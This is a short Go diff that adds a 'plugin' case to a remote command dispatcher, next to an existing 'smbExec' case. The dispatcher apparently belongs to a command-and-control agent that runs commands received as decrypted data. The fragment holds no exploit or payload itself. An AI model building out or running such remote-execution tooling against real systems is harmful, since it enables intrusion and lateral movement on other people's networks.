@@ -68,7 +68,9 @@ func Start() {
 			case "smbExec":
 				go smbExecCmd(sendUserId, decData)
 				break
-
+			case "plugin":
+				go pluginCmd(sendUserId, decData)
+				break
 			default:
 				break
 			}
